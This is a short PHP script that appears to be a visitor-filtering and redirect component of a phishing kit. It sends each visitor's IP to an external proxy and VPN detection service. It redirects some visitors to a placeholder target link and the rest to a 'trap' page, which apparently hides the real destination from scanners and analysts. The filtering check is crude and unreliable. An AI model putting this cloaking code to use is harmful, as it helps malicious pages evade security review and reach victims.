<?php
$ip = $_SERVER['REMOTE_ADDR'];
 $ch = curl_init();
   // set url 
    curl_setopt($ch, CURLOPT_URL, "http://check.getipintel.net/check.php?ip=$ip&contact=florencia_zheng@yahoo.com&format=json&flags=f/$ip");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
    $curlresult=curl_exec ($ch);

$hostname = $curlresult ;
$blocked_words = array 
(
"0",


     
    );
foreach($blocked_words as $word)
{
         if (substr_count($hostname, $word) > 0)
         
         {
             
    header('Location:replace your link here yourdomain/?neo');      }  
    
// if selesai    

    else 
    
    {
      echo "<script>  window.location= 'trap/index.php' </script>";
        
        
    }  
 
    

    
}


?>
